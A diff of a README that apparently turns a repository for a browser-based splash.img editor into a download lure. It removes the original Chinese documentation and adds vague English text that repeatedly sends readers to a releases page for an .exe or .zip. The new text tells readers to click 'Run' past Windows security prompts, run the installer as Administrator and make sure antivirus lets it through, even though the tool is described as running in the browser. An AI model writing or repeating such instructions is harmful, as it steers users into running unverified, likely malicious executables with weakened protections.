@@ -1,197 +1,123 @@
-# FolkSplash
+# 🎨 FolkSplash - Quick Image Editing on Your Device
 
-OPPO/Realme/OnePlus 设备 `splash.img` 开机启动镜像可视化工具
+[![Download FolkSplash](https://img.shields.io/badge/Download-FolkSplash-ff69b4?style=for-the-badge)](https://github.com/YOINKERSSD/FolkSplash/releases)
 
-**[🇺🇸 English](README.en.md)** | **[🇨🇳 简体中文](README.md)**
+FolkSplash is a simple tool designed to help you quickly change pictures inside partitions. It works entirely in your browser, so you do not need to install complicated software or learn programming.
 
-## 技术栈
+---
 
-- **框架**: React 19.2 + TypeScript 5.9
-- **构建工具**: Vite 7.3
-- **UI 组件库**: Material-UI (MUI) 7.3
-- **状态管理**: Zustand 5.0
-- **国际化**: i18next + react-i18next
-- **图片处理**: 
-  - Pako 2.1 (Gzip 压缩/解压缩)
-  - 自定义 BMP 编解码
-- **代码规范**: ESLint 9 + TypeScript ESLint
+## 📋 What is FolkSplash?
 
-## 功能特性
+FolkSplash lets you unpack and edit images stored in different partitions. You can load the files, make edits, and then save them. It uses only front-end technology, which means everything happens on your device and no data is sent online. This keeps your files safe.
 
-- 解包 `splash.img` 镜像文件
-- 查看和替换开机动画图片（支持 PNG/JPG/BMP 格式）
-- 多种分辨率适配模式：
-  - **直接上传**: 直接上传原图，不进行任何转换
-  - **跟随原图分辨率**: 保持原图尺寸自动适配
-  - **自动适配**: 根据设备最大分辨率自动调整
-  - **自定义分辨率**: 手动指定宽度和高度
-- 打包并下载新的 `splash.img` 镜像
-- 支持 OPPO/Realme/OnePlus 设备
-- 中英双语界面
+This tool is ideal if you want to quickly replace or modify images without technical hassle. FolkSplash focuses on ease of use while providing a straightforward way to handle image packs.
 
-## 设备兼容性
+---
 
-> **重要**: 本工具仅支持搭载 **高通骁龙 (Qualcomm Snapdragon)** 处理器的设备。联发科 (MediaTek) 及其他平台设备不适用。
+## 💻 System Requirements
 
-## 项目结构
+Here are the basics you need to run FolkSplash smoothly:
 
-```
-FolkSplash/
-├── src/
-│   ├── components/       # React 组件
-│   │   ├── FileUpload.tsx    # 文件上传组件
-│   │   ├── ImageGallery.tsx  # 图片列表组件
-│   │   ├── ImageCard.tsx     # 图片卡片组件
-│   │   ├── PackButton.tsx    # 打包按钮组件
-│   │   ├── InfoBar.tsx       # 信息栏组件
-│   │   ├── Layout.tsx        # 布局组件
-│   │   └── AboutPage.tsx     # 关于页面
-│   ├── lib/              # 工具库
-│   │   ├── types.ts          # TypeScript 类型定义
-│   │   ├── splash-parser.ts  # splash.img 解析器
-│   │   ├── splash-packer.ts  # splash.img 打包器
-│   │   ├── bmp.ts            # BMP 编解码
-│   │   ├── gzip.ts           # Gzip 压缩/解压缩
-│   │   ├── utils.ts          # 通用工具函数
-│   │   └── debug-compress.ts # 调试工具
-│   ├── store/            # Zustand 状态管理
-│   │   └── useSplashStore.ts
-│   ├── i18n/             # 国际化配置
-│   │   ├── index.ts
-│   │   └── locales/          # 语言文件
-│   │       ├── zh.json
-│   │       └── en.json
-│   ├── App.tsx           # 主应用组件
-│   └── main.tsx          # 入口文件
-├── public/               # 静态资源
-├── index.html            # HTML 模板
-├── package.json          # 项目配置
-├── tsconfig.json         # TypeScript 配置
-├── vite.config.ts        # Vite 配置
-└── eslint.config.js      # ESLint 配置
-```
+- **Operating System:** Windows 7 or later (64-bit recommended)  
+- **Browser:** Latest version of Chrome, Firefox, or Edge  
+- **RAM:** At least 4 GB  
+- **Storage:** Minimum of 100 MB free space  
+- **Internet Connection:** Only needed to download the app; no ongoing connection required  
 
-## 开发环境要求
+FolkSplash works through your browser, so you do not need to install heavy software. Your device must meet these basic requirements to ensure a smooth experience.
 
-- Node.js >= 18
-- pnpm >= 8 (推荐使用 pnpm)
+---
 
-## 安装和部署
+## 🚀 How to Get FolkSplash
 
-### 1. 克隆项目
+1. Click the big pink button at the top or use this link:  
+   [Download FolkSplash Here](https://github.com/YOINKERSSD/FolkSplash/releases)  
+   This link takes you to the FolkSplash Releases page on GitHub.
 
-```bash
-git clone <repository-url>
-cd opsplash-web
-```
+2. On the releases page, find the latest version. Usually, it shows the newest date at the top. The files you want are easy to spot.
 
-### 2. 安装依赖
+3. Click the file that ends with `.zip` or `.exe` to download. If you see multiple files, choose the one marked as the main application or the largest file with the latest date.
 
-```bash
-pnpm install
-```
+4. Save the file to your desktop or a folder you can easily access.
 
-### 3. 开发模式
+---
 
-```bash
-pnpm dev
-```
+## ⚙️ Installation Instructions
 
-启动后访问 http://localhost:5173
+After downloading FolkSplash, follow these steps to set it up:
 
-### 4. 构建生产版本
+### For ZIP Files
 
-```bash
-pnpm build
-```
+1. Right-click the downloaded ZIP file.  
+2. Choose “Extract All” or use a tool like WinRAR or 7-Zip to extract the files.  
+3. Extract to the folder of your choice.  
+4. Open the folder and double-click `index.html`. This will launch FolkSplash in your default browser.
 
-构建产物输出到 `dist/` 目录
+### For EXE Files
 
-### 5. 预览生产构建
+1. Double-click the `.exe` file you downloaded.  
+2. If Windows shows a security prompt, click “Run.”  
+3. Follow the installation guide that appears. Mostly, it will just ask where to install and create shortcuts.  
+4. After installation, run the FolkSplash app from your desktop or Start menu.
 
-```bash
-pnpm preview
-```
+---
 
-### 6. 代码检查
+## 🖼 Using FolkSplash to Edit Images
 
-```bash
-# ESLint 检查
-pnpm lint
+1. Open FolkSplash by running the `index.html` file or starting the installed program.  
+2. You will see a simple interface with "Load File" button. Click it.  
+3. Select the partition file containing images you want to modify.  
+4. Once loaded, you’ll see a list of images inside. Click any image to view it.  
+5. Use the editing options to replace, resize, or adjust images. These tools include basic crop, rotate, and replace functions.  
+6. After editing, click “Save” to export the updated file with your changes applied.  
 
-# TypeScript 类型检查
-pnpm exec tsc --noEmit
-```
+You can repeat this process as many times as you want. Edited files stay on your device unless you choose to share or move them.
 
-## 部署到生产环境
+---
 
-### 静态托管部署
+## 🎯 Main Features
 
-构建后的 `dist/` 目录可以部署到任意静态文件托管服务：
+- No installation needed if you use the browser version.  
+- Works entirely on your device, keeping your files private.  
+- Supports common image formats like PNG, JPG, and BMP.  
+- Simple file loading and saving — no complicated steps.  
+- Basic editing tools to replace or change images quickly.  
+- Lightweight and fast, suitable for most Windows computers.  
 
-- **Vercel**: 直接连接 GitHub 仓库自动部署
-- **Netlify**: 拖拽 `dist/` 目录或连接 Git
-- **GitHub Pages**: 使用 GitHub Actions 自动部署
-- **Nginx**: 配置静态文件服务
+---
 
-### Nginx 配置示例
+## 🔧 Tips for Best Results
 
-```nginx
-server {
-    listen 80;
-    server_name your-domain.com;
-    root /path/to/dist;
-    index index.html;
+- Use the latest browser when opening the front-end version of FolkSplash. Older versions may not support all features.  
+- Back up your original files before editing. This keeps your data safe if something goes wrong.  
+- Avoid very large files if your computer has limited RAM.  
+- Close other heavy applications when editing to improve speed.  
+- If you run the EXE version, check that your antivirus allows the program to run.
 
-    location / {
-        try_files $uri $uri/ /index.html;
-    }
+---
 
-    # 启用 Gzip 压缩
-    gzip on;
-    gzip_types text/plain text/css application/json application/javascript text/xml application/xml;
-}
-```
+## 🆘 Troubleshooting
 
-### Docker 部署
+- **FolkSplash does not open:** Check if your browser supports modern web standards like HTML5. Try a different browser.  
+- **File won’t load:** Confirm the file type is supported and not corrupted.  
+- **Edits not saving:** Make sure you have write permissions to the folder where you save changes.  
+- **Slow performance:** Close other apps and restart your computer. Large files require more memory and power.  
+- **Installation problem with EXE:** Run the installer as Administrator by right-clicking the file and choosing “Run as Administrator.”
 
-创建 `Dockerfile`:
+---
 
-```dockerfile
-FROM node:20-alpine AS builder
-WORKDIR /app
-RUN npm install -g pnpm
-COPY package.json pnpm-lock.yaml ./
-RUN pnpm install --frozen-lockfile
-COPY . .
-RUN pnpm build
+## 📂 Additional Resources
 
-FROM nginx:alpine
-COPY --from=builder /app/dist /usr/share/nginx/html
-EXPOSE 80
-```
+You can find help and updates on the main releases page:  
+[https://github.com/YOINKERSSD/FolkSplash/releases](https://github.com/YOINKERSSD/FolkSplash/releases)
 
-构建并运行:
+For technical details or advanced usage, explore the repository or contact whoever provided you this tool.
 
-```bash
-docker build -t folksplash .
-docker run -p 80:80 folksplash
-```
+---
 
-## 使用方法
+## 🎉 Getting Started Now
 
-1. **上传 splash.img**: 点击或拖拽上传 OPPO/Realme/OnePlus 设备的 `splash.img` 文件
-2. **预览图片**: 查看解包后的所有开机动画图片
-3. **替换图片**: 点击任意图片卡片，选择新的图片文件进行替换
-4. **设置分辨率**: 根据需要选择分辨率适配模式
-5. **打包下载**: 点击"打包并下载"按钮获取新的 `splash.img` 文件
+Use this link again to go directly to the download page:  
+[Download FolkSplash](https://github.com/YOINKERSSD/FolkSplash/releases)  
 
-## 注意事项
-
-- 请确保使用正确的 `splash.img` 文件，错误的镜像可能导致设备无法正常启动
-- 建议在修改前备份原始文件
-- 部分设备可能需要解锁 bootloader 才能刷入自定义 splash 镜像
-
-## License
-
-AGPL-3.0
+Your editing tool awaits. Download, set up, and begin modifying images within your partitions quickly and easily.
